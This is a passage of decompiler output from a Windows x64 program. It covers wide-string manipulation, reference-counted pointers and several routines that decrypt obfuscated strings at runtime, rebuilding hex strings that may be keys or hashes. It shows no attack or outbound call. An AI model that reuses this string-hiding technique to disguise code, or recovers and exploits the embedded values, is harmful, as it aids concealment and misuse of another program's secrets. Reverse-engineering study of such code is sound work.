        if ( (unsigned __int64)v8[3] >= 8 )
          v8 = (__int64 *)*v8;
        if ( (unsigned __int64)v5[3] < 8 )
          v20 = (__int64)v5;
        else
          v20 = *v5;
        if ( v12 )
          memcpy((void *)(v20 + 2 * v9), (char *)v8 + 2 * v7, 2 * v12);
      }
      v21 = (unsigned __int64)v5[3] < 8;
      v5[2] = v13;
      if ( v21 )
        v22 = (__int64)v5;
      else
        v22 = *v5;
      *(_WORD *)(v22 + 2 * v13) = 0;
    }
  }
  return v5;
}
// 14002E8CF: using guessed type char;
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014002E8D0) ----------------------------------------------------
__int64 *__fastcall sub_14002E8D0(__int64 *a1, unsigned __int64 a2, char *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rsi
  char *v5; // rdi
  unsigned __int64 v6; // r14
  __int64 *v7; // rbx
  unsigned __int64 v8; // r8
  char *v9; // rax
  __int64 v10; // rax
  __int64 *result; // rax
  unsigned __int64 v12; // rcx
  unsigned __int64 v13; // rbp
  unsigned __int64 v14; // rax
  __int64 v15; // rdx
  __int64 v16; // rcx
  __int64 v17; // rax
  bool v18; // cf
  __int64 v19; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !a3 )
    goto LABEL_39;
  v8 = a1[3];
  v9 = (char *)(v8 < 8 ? a1 : *a1);
  if ( v5 < v9 )
    goto LABEL_39;
  if ( v8 >= 8 )
    a1 = (__int64 *)*a1;
  if ( (char *)a1 + 2 * v7[2] > v5 )
  {
    if ( v8 < 8 )
      v10 = (__int64)v7;
    else
      v10 = *v7;
    result = sub_14002E750(v7, a2, v7, (signed __int64)&v5[-v10] >> 1, a4);
  }
  else
  {
LABEL_39:
    v12 = v7[2];
    if ( v12 < a2 )
    {
      std::_Xout_of_range("invalid string position");
      __debugbreak();
    }
    if ( -1i64 - v12 <= a4 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    if ( a4 )
    {
      v13 = v12 + a4;
      if ( sub_140004A90(v7, v12 + a4, 0) )
      {
        v14 = v7[3];
        if ( v14 < 8 )
          v15 = (__int64)v7;
        else
          v15 = *v7;
        if ( v14 < 8 )
          v16 = (__int64)v7;
        else
          v16 = *v7;
        if ( v7[2] != v6 )
          memmove((void *)(v16 + 2 * (v6 + v4)), (const void *)(v15 + 2 * v6), 2 * (v7[2] - v6));
        if ( (unsigned __int64)v7[3] < 8 )
          v17 = (__int64)v7;
        else
          v17 = *v7;
        if ( v4 )
          memcpy((void *)(v17 + 2 * v6), v5, 2 * v4);
        v18 = (unsigned __int64)v7[3] < 8;
        v7[2] = v13;
        if ( v18 )
          v19 = (__int64)v7;
        else
          v19 = *v7;
        *(_WORD *)(v19 + 2 * v13) = 0;
      }
    }
    result = v7;
  }
  return result;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014002EA40) ----------------------------------------------------
__int64 *__fastcall sub_14002EA40(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3, __int64 *a4, unsigned __int64 a5, unsigned __int64 a6)
{
  __int64 *v6; // rbx
  unsigned __int64 v7; // rcx
  __int64 *v8; // r15
  unsigned __int64 v9; // rbp
  unsigned __int64 v10; // rsi
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rdi
  unsigned __int64 v13; // r14
  unsigned __int64 v14; // rax
  unsigned __int64 v15; // rdx
  __int64 v16; // r13
  __int64 v17; // r14
  unsigned __int64 v18; // rax
  __int64 v19; // rdx
  __int64 v20; // rcx
  __int64 v21; // rax
  __int64 v22; // rcx
  __int64 v23; // rax
  unsigned __int64 v24; // rax
  __int64 v25; // rdx
  __int64 v26; // rcx
  size_t v27; // r8
  const void *v28; // rdx
  void *v29; // rcx
  __int64 v30; // rdx
  __int64 v31; // rcx
  unsigned __int64 v32; // rax
  __int64 v33; // rcx
  __int64 v34; // rax
  __int64 v35; // r15
  __int64 v36; // rdx
  __int64 v37; // rcx
  unsigned __int64 v38; // rax
  __int64 v39; // rcx
  __int64 v40; // rax
  __int64 v41; // rcx
  __int64 v42; // rax
  unsigned __int64 v43; // rax
  __int64 v44; // rdx
  __int64 v45; // rcx
  unsigned __int64 v46; // rax
  __int64 v47; // rdx
  __int64 v48; // rcx
  bool v49; // cf
  __int64 v50; // rax

  v6 = a1;
  v7 = a1[2];
  v8 = a4;
  v9 = a3;
  v10 = a2;
  if ( v7 < a2 || (v11 = a4[2], v11 < a5) )
  {
    std::_Xout_of_range("invalid string position");
    JUMPOUT(*(_QWORD *)&byte_14002EDC0);
  }
  v12 = a6;
  v13 = v7 - a2;
  if ( v7 - a2 < a3 )
    v9 = v7 - a2;
  v14 = v11 - a5;
  if ( v14 < a6 )
    v12 = v14;
  v15 = v7 - v9;
  if ( -1i64 - v12 <= v7 - v9 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v16 = v15 + v12;
  v17 = v13 - v9;
  if ( v7 < v15 + v12 )
    sub_140004A90(v6, v15 + v12, 0);
  v18 = v6[3];
  if ( v6 != v8 )
  {
    if ( v18 < 8 )
      v19 = (__int64)v6;
    else
      v19 = *v6;
    if ( v18 < 8 )
      v20 = (__int64)v6;
    else
      v20 = *v6;
    if ( v17 )
      memmove((void *)(v20 + 2 * (v10 + v12)), (const void *)(v19 + 2 * (v10 + v9)), 2 * v17);
    if ( (unsigned __int64)v8[3] >= 8 )
      v8 = (__int64 *)*v8;
    if ( (unsigned __int64)v6[3] < 8 )
      v21 = (__int64)v6;
    else
      v21 = *v6;
    if ( v12 )
      memcpy((void *)(v21 + 2 * v10), (char *)v8 + 2 * a5, 2 * v12);
    goto LABEL_103;
  }
  if ( v12 > v9 )
  {
    if ( a5 > v10 )
    {
      v35 = v10 + v9;
      if ( v10 + v9 > a5 )
      {
        if ( v18 < 8 )
          v41 = (__int64)v6;
        else
          v41 = *v6;
        if ( v18 < 8 )
          v42 = (__int64)v6;
        else
          v42 = *v6;
        if ( v9 )
          memmove((void *)(v42 + 2 * v10), (const void *)(v41 + 2 * a5), 2 * v9);
        v43 = v6[3];
        if ( v43 < 8 )
          v44 = (__int64)v6;
        else
          v44 = *v6;
        if ( v43 < 8 )
          v45 = (__int64)v6;
        else
          v45 = *v6;
        if ( v17 )
          memmove((void *)(v45 + 2 * (v10 + v12)), (const void *)(v44 + 2 * v35), 2 * v17);
        v46 = v6[3];
        if ( v46 < 8 )
          v47 = (__int64)v6;
        else
          v47 = *v6;
        if ( v46 < 8 )
          v48 = (__int64)v6;
        else
          v48 = *v6;
        if ( v12 != v9 )
        {
          v27 = 2 * (v12 - v9);
          v29 = (void *)(v48 + 2 * v35);
          v28 = (const void *)(v47 + 2 * (a5 + v12));
          goto LABEL_102;
        }
      }
      else
      {
        if ( v18 < 8 )
          v36 = (__int64)v6;
        else
          v36 = *v6;
        if ( v18 < 8 )
          v37 = (__int64)v6;
        else
          v37 = *v6;
        if ( v17 )
          memmove((void *)(v37 + 2 * (v10 + v12)), (const void *)(v36 + 2 * v35), 2 * v17);
        v38 = v6[3];
        if ( v38 < 8 )
          v39 = (__int64)v6;
        else
          v39 = *v6;
        if ( v38 < 8 )
          v40 = (__int64)v6;
        else
          v40 = *v6;
        if ( v12 )
        {
          v27 = 2 * v12;
          v28 = (const void *)(v39 + 2 * (v12 + a5 - v9));
          v29 = (void *)(v40 + 2 * v10);
          goto LABEL_102;
        }
      }
    }
    else
    {
      if ( v18 < 8 )
        v30 = (__int64)v6;
      else
        v30 = *v6;
      if ( v18 < 8 )
        v31 = (__int64)v6;
      else
        v31 = *v6;
      if ( v17 )
        memmove((void *)(v31 + 2 * (v10 + v12)), (const void *)(v30 + 2 * (v10 + v9)), 2 * v17);
      v32 = v6[3];
      if ( v32 < 8 )
        v33 = (__int64)v6;
      else
        v33 = *v6;
      if ( v32 < 8 )
        v34 = (__int64)v6;
      else
        v34 = *v6;
      if ( v12 )
      {
        v28 = (const void *)(v33 + 2 * a5);
        v27 = 2 * v12;
        v29 = (void *)(v34 + 2 * v10);
        goto LABEL_102;
      }
    }
  }
  else
  {
    if ( v18 < 8 )
      v22 = (__int64)v6;
    else
      v22 = *v6;
    if ( v18 < 8 )
      v23 = (__int64)v6;
    else
      v23 = *v6;
    if ( v12 )
      memmove((void *)(v23 + 2 * v10), (const void *)(v22 + 2 * a5), 2 * v12);
    v24 = v6[3];
    if ( v24 < 8 )
      v25 = (__int64)v6;
    else
      v25 = *v6;
    if ( v24 < 8 )
      v26 = (__int64)v6;
    else
      v26 = *v6;
    if ( v17 )
    {
      v27 = 2 * v17;
      v28 = (const void *)(v25 + 2 * (v10 + v9));
      v29 = (void *)(v26 + 2 * (v10 + v12));
LABEL_102:
      memmove(v29, v28, v27);
      goto LABEL_103;
    }
  }
LABEL_103:
  v49 = (unsigned __int64)v6[3] < 8;
  v6[2] = v16;
  if ( v49 )
    v50 = (__int64)v6;
  else
    v50 = *v6;
  *(_WORD *)(v50 + 2 * v16) = 0;
  return v6;
}
// 14002EDC0: using guessed type char;
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014002EDD0) ----------------------------------------------------
_QWORD *__fastcall sub_14002EDD0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A7528;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A7528: using guessed type __int64 (__fastcall *off_1400A7528)();

//----- (000000014002EE40) ----------------------------------------------------
void __fastcall sub_14002EE40(void *a1)
{
  volatile signed __int32 *v1; // rbx
  void *v2; // rdi

  if ( a1 )
  {
    v1 = (volatile signed __int32 *)*((_QWORD *)a1 + 2);
    v2 = a1;
    if ( v1 && !_InterlockedDecrement(v1 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v1 + 8i64))(v1);
      if ( !_InterlockedDecrement(v1 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v1 + 16i64))(v1);
    }
    operator delete(v2);
  }
}

//----- (000000014002EEA0) ----------------------------------------------------
__int64 __fastcall sub_14002EEA0(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rsi
  __int64 *v3; // rax
  volatile signed __int32 *v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // ST28_8
  volatile signed __int32 *v7; // rbx
  __int64 result; // rax
  __int64 v9; // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  volatile signed __int32 *v11; // [rsp+50h] [rbp+8h]

  v2 = a1;
  v9 = a2;
  v3 = sub_14002EDD0(&v11, a2);
  v10 = *v3;
  *v3 = 0i64;
  v4 = v11;
  if ( v11 )
  {
    if ( !_InterlockedDecrement(v11 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  sub_140008430();
  v5 = v9;
  v6 = *v2;
  *v2 = v5;
  v7 = (volatile signed __int32 *)v2[1];
  result = v10;
  v2[1] = v10;
  if ( v7 && !_InterlockedDecrement(v7 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
    if ( !_InterlockedDecrement(v7 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 16i64))(v7);
  }
  return result;
}

//----- (000000014002F160) ----------------------------------------------------
void __fastcall sub_14002F160(_BYTE *a1)
{
  *a1 = 1;
}

//----- (000000014002F170) ----------------------------------------------------
__int64 __fastcall sub_14002F170(unsigned __int8 *a1)
{
  return *a1;
}

//----- (000000014002F180) ----------------------------------------------------
char *sub_14002F180()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DA554;
  if ( dword_1400DA554 & 1 )
  {
    v2 = byte_1400DA550;
  }
  else
  {
    v1 = 69069 * dword_1400DA548 + 1234567;
    v0 = dword_1400DA554 | 1;
    dword_1400DA548 = v1;
    dword_1400DA554 |= 1u;
    dword_1400DA540 = HIWORD(dword_1400DA540) + 36969 * (unsigned __int16)dword_1400DA540;
    LOBYTE(v1) = (BYTE2(dword_1400DA54C) + 80 * dword_1400DA54C) ^ v1;
    dword_1400DA54C = HIWORD(dword_1400DA54C) + 18000 * (unsigned __int16)dword_1400DA54C;
    v2 = (((unsigned int)dword_1400DA544 >> 13) ^ 32 * dword_1400DA544 ^ dword_1400DA544) + v1;
    dword_1400DA544 ^= ((unsigned int)dword_1400DA544 >> 13) ^ 32 * (dword_1400DA544 ^ (dword_1400DA544 << 12));
    byte_1400DA550 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DA554 = v0 | 2;
    byte_1400DA558[0] = v2 ^ 0x37;
    byte_1400DA559 = (v2 - 1) ^ 0x66;
    byte_1400DA55A = (v2 - 2) ^ 0x65;
    byte_1400DA55B = (v2 - 3) ^ 0x35;
    byte_1400DA55C = (v2 - 4) ^ 0x33;
    byte_1400DA55D = (v2 - 5) ^ 0x62;
    byte_1400DA55E = (v2 - 6) ^ 0x63;
    byte_1400DA55F = (v2 - 7) ^ 0x32;
    byte_1400DA560 = (v2 - 8) ^ 0x65;
    byte_1400DA561 = (v2 - 9) ^ 0x64;
    byte_1400DA562 = (v2 - 10) ^ 0x32;
    byte_1400DA563 = (v2 - 11) ^ 0x38;
    byte_1400DA564 = (v2 - 12) ^ 0x33;
    byte_1400DA565 = (v2 - 13) ^ 0x34;
    byte_1400DA566 = (v2 - 14) ^ 0x61;
    byte_1400DA567 = (v2 - 15) ^ 0x63;
    byte_1400DA568 = (v2 - 16) ^ 0x38;
    byte_1400DA569 = (v2 - 17) ^ 0x32;
    byte_1400DA56A = (v2 - 18) ^ 0x37;
    byte_1400DA56B = (v2 - 19) ^ 0x66;
    byte_1400DA56C = (v2 - 20) ^ 0x30;
    byte_1400DA56D = (v2 - 21) ^ 0x38;
    byte_1400DA56E = (v2 - 22) ^ 0x63;
    byte_1400DA56F = (v2 - 23) ^ 0x36;
    byte_1400DA570 = (v2 - 24) ^ 0x65;
    byte_1400DA571 = (v2 - 25) ^ 0x30;
    byte_1400DA572 = (v2 - 26) ^ 0x61;
    byte_1400DA573 = (v2 - 27) ^ 0x37;
    byte_1400DA574 = (v2 - 28) ^ 0x36;
    byte_1400DA575 = (v2 - 29) ^ 0x34;
    byte_1400DA576 = (v2 - 30) ^ 0x63;
    byte_1400DA577 = (v2 - 31) ^ 0x35;
    byte_1400DA578 = (v2 - 32) ^ 0x36;
    byte_1400DA579 = (v2 - 33) ^ 0x31;
    byte_1400DA57A = (v2 - 34) ^ 0x33;
    byte_1400DA57B = (v2 - 35) ^ 0x33;
    byte_1400DA57C = (v2 - 36) ^ 0x39;
    byte_1400DA57D = (v2 - 37) ^ 0x38;
    byte_1400DA57E = (v2 - 38) ^ 0x66;
    byte_1400DA57F = (v2 - 39) ^ 0x36;
  }
  result = byte_1400DA580;
  if ( !byte_1400DA580[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DA558[v5++];
      v7 = v2 - v4++;
      byte_1400DA580[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0x28 );
  }
  return result;
}
// 1400DA540: using guessed type int dword_1400DA540;
// 1400DA544: using guessed type int dword_1400DA544;
// 1400DA548: using guessed type int dword_1400DA548;
// 1400DA54C: using guessed type int dword_1400DA54C;
// 1400DA550: using guessed type char byte_1400DA550;
// 1400DA554: using guessed type int dword_1400DA554;
// 1400DA559: using guessed type char byte_1400DA559;
// 1400DA55A: using guessed type char byte_1400DA55A;
// 1400DA55B: using guessed type char byte_1400DA55B;
// 1400DA55C: using guessed type char byte_1400DA55C;
// 1400DA55D: using guessed type char byte_1400DA55D;
// 1400DA55E: using guessed type char byte_1400DA55E;
// 1400DA55F: using guessed type char byte_1400DA55F;
// 1400DA560: using guessed type char byte_1400DA560;
// 1400DA561: using guessed type char byte_1400DA561;
// 1400DA562: using guessed type char byte_1400DA562;
// 1400DA563: using guessed type char byte_1400DA563;
// 1400DA564: using guessed type char byte_1400DA564;
// 1400DA565: using guessed type char byte_1400DA565;
// 1400DA566: using guessed type char byte_1400DA566;
// 1400DA567: using guessed type char byte_1400DA567;
// 1400DA568: using guessed type char byte_1400DA568;
// 1400DA569: using guessed type char byte_1400DA569;
// 1400DA56A: using guessed type char byte_1400DA56A;
// 1400DA56B: using guessed type char byte_1400DA56B;
// 1400DA56C: using guessed type char byte_1400DA56C;
// 1400DA56D: using guessed type char byte_1400DA56D;
// 1400DA56E: using guessed type char byte_1400DA56E;
// 1400DA56F: using guessed type char byte_1400DA56F;
// 1400DA570: using guessed type char byte_1400DA570;
// 1400DA571: using guessed type char byte_1400DA571;
// 1400DA572: using guessed type char byte_1400DA572;
// 1400DA573: using guessed type char byte_1400DA573;
// 1400DA574: using guessed type char byte_1400DA574;
// 1400DA575: using guessed type char byte_1400DA575;
// 1400DA576: using guessed type char byte_1400DA576;
// 1400DA577: using guessed type char byte_1400DA577;
// 1400DA578: using guessed type char byte_1400DA578;
// 1400DA579: using guessed type char byte_1400DA579;
// 1400DA57A: using guessed type char byte_1400DA57A;
// 1400DA57B: using guessed type char byte_1400DA57B;
// 1400DA57C: using guessed type char byte_1400DA57C;
// 1400DA57D: using guessed type char byte_1400DA57D;
// 1400DA57E: using guessed type char byte_1400DA57E;
// 1400DA57F: using guessed type char byte_1400DA57F;

//----- (000000014002F460) ----------------------------------------------------
_QWORD *__fastcall sub_14002F460(_QWORD *a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, __int64 a5)
{
  _QWORD *v5; // rbx
  _QWORD *v6; // rdi
  _QWORD *v7; // rsi
  _QWORD *v8; // rcx
  signed __int64 v9; // rcx
  signed __int64 v10; // rcx

  v5 = a4;
  v6 = a2;
  v7 = a1;
  *a1 = off_1400A7300;
  v8 = a1 + 1;
  v8[3] = 15i64;
  v8[2] = 0i64;
  *(_BYTE *)v8 = 0;
  sub_140004DF0(v8, a3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v9 = (signed __int64)(v7 + 5);
  *(_QWORD *)(v9 + 24) = 15i64;
  *(_QWORD *)(v9 + 16) = 0i64;
  *(_BYTE *)v9 = 0;
  sub_140004DF0(v7 + 5, v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v10 = (signed __int64)(v7 + 9);
  *(_QWORD *)(v10 + 24) = 15i64;
  *(_QWORD *)(v10 + 16) = 0i64;
  *(_BYTE *)v10 = 0;
  sub_140004DF0(v7 + 9, v6, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v7[13] = a5;
  v7[14] = 0i64;
  v7[14] = GetTickCount();
  return v7;
}
// 1400A7300: using guessed type __int64 (__fastcall *off_1400A7300[2])(void *);

//----- (000000014002F540) ----------------------------------------------------
void __fastcall sub_14002F540(__int64 a1)
{
  sub_14002FAE0(a1, 1);
}

//----- (000000014002F550) ----------------------------------------------------
void __fastcall sub_14002F550(__int64 a1)
{
  sub_14002FAE0(a1, 2);
}

//----- (000000014002F560) ----------------------------------------------------
void __fastcall sub_14002F560(__int64 a1)
{
  sub_14002FAE0(a1, 0);
}

//----- (000000014002F570) ----------------------------------------------------
_QWORD *__fastcall sub_14002F570(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA600;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA600 & 1 )
  {
    v5 = byte_1400DA5FD;
  }
  else
  {
    v4 = 69069 * dword_1400DA5D8 + 1234567;
    v1 = dword_1400DA600 | 1;
    dword_1400DA5D8 = v4;
    dword_1400DA600 |= 1u;
    dword_1400DA5D0 = HIWORD(dword_1400DA5D0) + 36969 * (unsigned __int16)dword_1400DA5D0;
    LOBYTE(v4) = (BYTE2(dword_1400DA5E0) + 80 * dword_1400DA5E0) ^ v4;
    dword_1400DA5E0 = HIWORD(dword_1400DA5E0) + 18000 * (unsigned __int16)dword_1400DA5E0;
    v5 = (((unsigned int)dword_1400DA5D4 >> 13) ^ 32 * dword_1400DA5D4 ^ dword_1400DA5D4) + v4;
    dword_1400DA5D4 ^= ((unsigned int)dword_1400DA5D4 >> 13) ^ 32 * (dword_1400DA5D4 ^ (dword_1400DA5D4 << 12));
    byte_1400DA5FD = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA600 = v1 | 2;
    byte_1400DA608[0] = v5 ^ 0x34;
    byte_1400DA609 = (v5 - 1) ^ 0x61;
    byte_1400DA60A = (v5 - 2) ^ 0x62;
    byte_1400DA60B = (v5 - 3) ^ 0x39;
    byte_1400DA60C = (v5 - 4) ^ 0x35;
    byte_1400DA60D = (v5 - 5) ^ 0x30;
    byte_1400DA60E = (v5 - 6) ^ 0x63;
    byte_1400DA60F = (v5 - 7) ^ 0x30;
    byte_1400DA610 = (v5 - 8) ^ 0x65;
    byte_1400DA611 = (v5 - 9) ^ 0x31;
    byte_1400DA612 = (v5 - 10) ^ 0x39;
    byte_1400DA613 = (v5 - 11) ^ 0x65;
    byte_1400DA614 = (v5 - 12) ^ 0x33;
    byte_1400DA615 = (v5 - 13) ^ 0x62;
    byte_1400DA616 = (v5 - 14) ^ 0x63;
    byte_1400DA617 = (v5 - 15) ^ 0x64;
    byte_1400DA618 = (v5 - 16) ^ 0x33;
    byte_1400DA619 = (v5 - 17) ^ 0x36;
    byte_1400DA61A = (v5 - 18) ^ 0x36;
    byte_1400DA61B = (v5 - 19) ^ 0x32;
    byte_1400DA61C = (v5 - 20) ^ 0x35;
    byte_1400DA61D = (v5 - 21) ^ 0x65;
    byte_1400DA61E = (v5 - 22) ^ 0x39;
    byte_1400DA61F = (v5 - 23) ^ 0x36;
    byte_1400DA620 = (v5 - 24) ^ 0x30;
    byte_1400DA621 = (v5 - 25) ^ 0x64;
    byte_1400DA622 = (v5 - 26) ^ 0x30;
    byte_1400DA623 = (v5 - 27) ^ 0x65;
    byte_1400DA624 = (v5 - 28) ^ 0x39;
    byte_1400DA625 = (v5 - 29) ^ 0x32;
    byte_1400DA626 = (v5 - 30) ^ 0x37;
    byte_1400DA627 = (v5 - 31) ^ 0x66;
    byte_1400DA628 = (v5 - 32) ^ 0x37;
    byte_1400DA629 = (v5 - 33) ^ 0x38;
    byte_1400DA62A = (v5 - 34) ^ 0x35;
    byte_1400DA62B = (v5 - 35) ^ 0x63;
    byte_1400DA62C = (v5 - 36) ^ 0x61;
    byte_1400DA62D = (v5 - 37) ^ 0x63;
    byte_1400DA62E = (v5 - 38) ^ 0x36;
    byte_1400DA62F = (v5 - 39) ^ 0x31;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x28ui64 )
  {
    sub_140004790(Src, 0x28ui64, 0i64);
    v5 = byte_1400DA5FD;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v6[4] = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 40i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 40) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA608[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x28 );
  return v3;
}
// 1400DA5D0: using guessed type int dword_1400DA5D0;
// 1400DA5D4: using guessed type int dword_1400DA5D4;
// 1400DA5D8: using guessed type int dword_1400DA5D8;
// 1400DA5E0: using guessed type int dword_1400DA5E0;
// 1400DA5FD: using guessed type char byte_1400DA5FD;
// 1400DA600: using guessed type int dword_1400DA600;
// 1400DA609: using guessed type char byte_1400DA609;
// 1400DA60A: using guessed type char byte_1400DA60A;
// 1400DA60B: using guessed type char byte_1400DA60B;
// 1400DA60C: using guessed type char byte_1400DA60C;
// 1400DA60D: using guessed type char byte_1400DA60D;
// 1400DA60E: using guessed type char byte_1400DA60E;
// 1400DA60F: using guessed type char byte_1400DA60F;
// 1400DA610: using guessed type char byte_1400DA610;
// 1400DA611: using guessed type char byte_1400DA611;
// 1400DA612: using guessed type char byte_1400DA612;
// 1400DA613: using guessed type char byte_1400DA613;
// 1400DA614: using guessed type char byte_1400DA614;
// 1400DA615: using guessed type char byte_1400DA615;
// 1400DA616: using guessed type char byte_1400DA616;
// 1400DA617: using guessed type char byte_1400DA617;
// 1400DA618: using guessed type char byte_1400DA618;
// 1400DA619: using guessed type char byte_1400DA619;
// 1400DA61A: using guessed type char byte_1400DA61A;
// 1400DA61B: using guessed type char byte_1400DA61B;
// 1400DA61C: using guessed type char byte_1400DA61C;
// 1400DA61D: using guessed type char byte_1400DA61D;
// 1400DA61E: using guessed type char byte_1400DA61E;
// 1400DA61F: using guessed type char byte_1400DA61F;
// 1400DA620: using guessed type char byte_1400DA620;
// 1400DA621: using guessed type char byte_1400DA621;
// 1400DA622: using guessed type char byte_1400DA622;
// 1400DA623: using guessed type char byte_1400DA623;
// 1400DA624: using guessed type char byte_1400DA624;
// 1400DA625: using guessed type char byte_1400DA625;
// 1400DA626: using guessed type char byte_1400DA626;
// 1400DA627: using guessed type char byte_1400DA627;
// 1400DA628: using guessed type char byte_1400DA628;
// 1400DA629: using guessed type char byte_1400DA629;
// 1400DA62A: using guessed type char byte_1400DA62A;
// 1400DA62B: using guessed type char byte_1400DA62B;
// 1400DA62C: using guessed type char byte_1400DA62C;
// 1400DA62D: using guessed type char byte_1400DA62D;
// 1400DA62E: using guessed type char byte_1400DA62E;
// 1400DA62F: using guessed type char byte_1400DA62F;

//----- (000000014002F8D0) ----------------------------------------------------
_QWORD *__fastcall sub_14002F8D0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA5E8;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA5E8 & 1 )
  {
    v5 = byte_1400DA5E4;
  }
  else
  {
    v4 = 69069 * dword_1400DA5D8 + 1234567;
    v1 = dword_1400DA5E8 | 1;
    dword_1400DA5D8 = v4;
    dword_1400DA5E8 |= 1u;
    dword_1400DA5D0 = HIWORD(dword_1400DA5D0) + 36969 * (unsigned __int16)dword_1400DA5D0;
    LOBYTE(v4) = (BYTE2(dword_1400DA5E0) + 80 * dword_1400DA5E0) ^ v4;
    dword_1400DA5E0 = HIWORD(dword_1400DA5E0) + 18000 * (unsigned __int16)dword_1400DA5E0;
    v5 = (((unsigned int)dword_1400DA5D4 >> 13) ^ 32 * dword_1400DA5D4 ^ dword_1400DA5D4) + v4;
    dword_1400DA5D4 ^= ((unsigned int)dword_1400DA5D4 >> 13) ^ 32 * (dword_1400DA5D4 ^ (dword_1400DA5D4 << 12));
    byte_1400DA5E4 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA5E8 = v1 | 2;
    byte_1400DA5F0[0] = v5 ^ 0x74;
    byte_1400DA5F1 = (v5 - 1) ^ 0x33;
    byte_1400DA5F2 = (v5 - 2) ^ 0x6C;
    byte_1400DA5F3 = (v5 - 3) ^ 0x34;
    byte_1400DA5F4 = (v5 - 4) ^ 0x35;
    byte_1400DA5F5 = (v5 - 5) ^ 0x38;
    byte_1400DA5F6 = (v5 - 6) ^ 0x2F;
    byte_1400DA5F7 = (v5 - 7) ^ 0x2A;
    byte_1400DA5F8 = (v5 - 8) ^ 0x2D;
    byte_1400DA5F9 = (v5 - 9) ^ 0x73;
    byte_1400DA5FA = (v5 - 10) ^ 0x74;
    byte_1400DA5FB = (v5 - 11) ^ 0x67;
    byte_1400DA5FC = (v5 - 12) ^ 0x61;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xDui64 )
  {
    sub_140004790(Src, 0xDui64, 0i64);
    v5 = byte_1400DA5E4;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 12) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 13i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 13) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
